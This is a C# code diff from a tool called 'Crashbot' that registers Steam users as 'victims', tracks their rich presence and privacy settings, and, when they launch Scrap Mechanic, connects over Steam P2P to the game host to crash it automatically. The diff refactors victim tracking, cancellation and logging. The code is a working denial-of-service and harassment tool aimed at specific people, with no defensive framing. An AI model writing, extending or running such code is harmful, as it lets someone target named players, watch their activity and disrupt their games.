@@ -1,9 +1,11 @@
-﻿using Steamworks;
+﻿using Crashbot.Steam;
+using Crashbot.Util;
+using Steamworks;
 using System.Collections.Concurrent;
-using System.Diagnostics;
+using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Text;
-using static Crashbot.Victim;
+using static Crashbot.Steam.Victim;
 
 namespace Crashbot
 {
@@ -20,7 +22,7 @@ namespace Crashbot
             {
                 m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                 m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
-                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = Int32.MaxValue }
+                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = int.MaxValue }
             }
         ];
 
@@ -44,7 +46,7 @@ namespace Crashbot
         }
 
         private static readonly ConcurrentBag<Task<SteamInterface>> steamInterfaceThreads = [];
-        private readonly ConcurrentDictionary<CSteamID, Victim> victims = [];
+        private readonly ConcurrentDictionary<CSteamID, (Victim Victim, CancellationTokenSource Interupt)> SteamUsers = [];
 
         /// <summary>
         /// Creates a new steam interface in a detached thread.
@@ -61,40 +63,65 @@ namespace Crashbot
             => new(InterfaceMode.Syncronous);
 
         /// <summary>
-        /// 
+        /// Adds a new victim for auto-crashing
+        /// </summary>
+        /// <param name="steamid"></param>
+        /// <returns></returns>
+        public Victim AddNewVictim(ulong steamid)
+        {
+            var vic = new Victim(new(steamid));
+            this.AddNewVictim(vic);
+            return vic;
+        }
+
+        /// <summary>
+        /// Adds a new victim for auto-crashing
         /// </summary>
         /// <param name="victim"></param>
         /// <returns></returns>
         public bool AddNewVictim(Victim victim)
-            => this.victims.TryAdd(victim.SteamId, victim);
+        {
+            this.CrashVictimWhenReady(victim);
+            return this.SteamUsers.TryAdd(victim.SteamId, (victim, new()));
+        }
 
         /// <summary>
-        /// 
+        /// Removes victim and stops tracking and crashing
         /// </summary>
-        /// <param name="victim"></param>
-        public void GetVictimRichPresence(Victim victim)
-            => this.GetVictimRichPresence(victim.SteamId);
+        /// <param name="v"></param>
+        public void RemoveVictim(Victim v)
+        {
+            if (this.SteamUsers.TryRemove(v.SteamId, out var SteamUser))
+            {
+                SteamUser.Interupt.Cancel();
+                SteamUser.Interupt.Token.WaitHandle.WaitOne(1000);
+            }
+        }
 
         /// <summary>
-        /// 
+        /// Waits until steam has initialized
         /// </summary>
-        /// <param name="victim"></param>
-        /// <returns></returns>
-        public string LoadVictimName(Victim victim)
+        public void WaitUntilSteamReady()
+        {
+            while (!this.SteamThread.SteamIsReady)
+                Task.Delay(1).Wait();
+        }
+
+        internal string LoadVictimName(Victim victim)
         {
             string name = this.LoadVictimName(victim.SteamId);
             victim.OnNameLoaded(name);
             return name;
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="v"></param>
-        public void CrashVictimWhenReady(Victim v)
+        internal void GetVictimRichPresence(Victim victim)
+            => this.GetVictimRichPresence(victim.SteamId);
+
+        internal void CrashVictimWhenReady(Victim v)
         {
-            if (this.victims.TryGetValue(v.SteamId, out var victim))
+            if (this.SteamUsers.TryGetValue(v.SteamId, out var SteamUser))
             {
+                Victim victim = SteamUser.Victim;
                 AutoResetEvent Step = new(false);
 
                 void onSettingsLoaded(PrivacyState _)
@@ -106,12 +133,11 @@ namespace Crashbot
 
                 victim.StartTracking();
                 string name = this.LoadVictimName(victim);
-                Console.WriteLine($"Targeting '{name}'", Verbosity.Normal);
+                Logger.WriteLine($"Targeting '{name}'", Verbosity.Normal);
 
                 Step.WaitOne();
-                CancellationTokenSource interuptSource = new();
 
-                Console.WriteLine($"Now watching {name} ({v.SteamId})...", Verbosity.Normal);
+                Logger.WriteLine($"Now watching {name} ({v.SteamId})...", Verbosity.Normal);
 
                 if (victim.PrivacySettings == PrivacyState.Private)
                 {
@@ -120,30 +146,18 @@ namespace Crashbot
                 }
 
                 bool previousState = !victim.IsPlayingScrapMechanic;
-                CancellationTokenSource? previousSource = interuptSource;
 
                 // wait for RP and fast track
                 void onGameChange(bool isPlaying)
                 {
-                    if (isPlaying == previousState)
-                        return;
-
-                    if (previousSource is not null)
-                    {
-                        previousSource.Cancel();
-                        previousSource.Token.WaitHandle.WaitOne(1000);
-                        previousSource.Dispose();
-                        previousSource = null;
-                    }
+                    SteamUser.Interupt.Cancel();
+                    SteamUser.Interupt.Token.WaitHandle.WaitOne(1000);
 
                     if (isPlaying)
                     {
-                        interuptSource = new();
-                        this.CrashClientAsync(victim, interuptSource);
-                        previousSource = interuptSource;
+                        SteamUser.Interupt = new();
+                        this.CrashClientAsync(victim, SteamUser.Interupt);
                     }
-
-                    previousState = isPlaying;
                 };
 
                 victim.GetRichPresence += (_, _) => this.GetVictimRichPresence(victim);
@@ -168,22 +182,23 @@ namespace Crashbot
                 SteamNetworkingIdentity remoteIdentity = new();
                 remoteIdentity.SetSteamID(mega_victim.HostSteamId);
 
-                Console.WriteLine($"Preparing to crash host {mega_victim.HostSteamId} for victim {mega_victim.SteamId}", Verbosity.Verbose);
+                Logger.WriteLine($"Preparing to crash host {mega_victim.HostSteamId} for victim {mega_victim.SteamId}", Verbosity.Verbose);
                 var (cx, ix) =
-                    this.SteamThread.ConnectP2P(ref remoteIdentity, 0, SteamInterface.LongTimeoutOptions.Length, SteamInterface.LongTimeoutOptions, interuptSource.Token);
+                    this.SteamThread.ConnectP2P(ref remoteIdentity, 0, LongTimeoutOptions.Length, LongTimeoutOptions, interuptSource.Token);
 
                 if (cx is null || ix is null)
                 {
                     mega_victim.IsCrashing = false;
-                    Console.WriteLine($"Exiting early, likely due to token cancelation: {interuptSource.IsCancellationRequested}", Verbosity.Debug);
+                    Logger.WriteLine($"Exiting early, likely due to token cancelation: {interuptSource.IsCancellationRequested}", Verbosity.Debug);
                     return;
                 }
 
                 SteamNetConnectionInfo_t info = ix.Value;
                 HSteamNetConnection conn = cx.Value;
 
+                // Wait for 1 msg or 2 seconds
                 CancellationTokenSource cancellationTokenSource = new();
-                Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new IntPtr[1], 1), cancellationTokenSource.Token)
+                Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new nint[1], 1), cancellationTokenSource.Token)
                     .ContinueWith(_ =>
                     {
                         for (int i = 0; i < FUN_TIME; i++)
@@ -195,17 +210,17 @@ namespace Crashbot
 
                         Task.Delay(500).Wait();
 
-                        Console.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
+                        mega_victim.OnVictimCrashed();
+                        Logger.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);
 
                         SteamNetworkingSockets.CloseConnection(conn, 0, "Cancelled", false);
                         SteamNetworkingSockets.ResetIdentity(ref remoteIdentity);
                         SteamAPI.RunCallbacks();
 
                         mega_victim.IsCrashing = false;
-                        mega_victim.OnRichPresenceUpdate([]);
                     });
 
-                Task.Delay(1000).ContinueWith(_ => cancellationTokenSource.Cancel());
+                Task.Delay(2000).ContinueWith(_ => cancellationTokenSource.Cancel());
             }
         }
 
@@ -227,9 +242,10 @@ namespace Crashbot
         {
             Callback<FriendRichPresenceUpdate_t>.Create(result =>
             {
-                if (this.victims.TryGetValue(result.m_steamIDFriend, out var victim))
+                if (this.SteamUsers.TryGetValue(result.m_steamIDFriend, out var SteamUser))
                 {
-                    var currentRP = this.LoadUserRP(victim.SteamId);
+                    Victim victim = SteamUser.Victim;
+                    var currentRP = LoadUserRP(victim.SteamId);
                     victim.OnRichPresenceUpdate(currentRP);
                 }
             });
@@ -259,12 +275,6 @@ namespace Crashbot
         {
             byte[] hash = SHA512.HashData(Encoding.UTF8.GetBytes(richPresence));
             return BitConverter.ToUInt64(hash, 0);
-        }
-
-        public void WaitUntilSteamReady()
-        {
-            while (!this.SteamThread.SteamIsReady)
-                Task.Delay(1).Wait();
         }
     }
 }
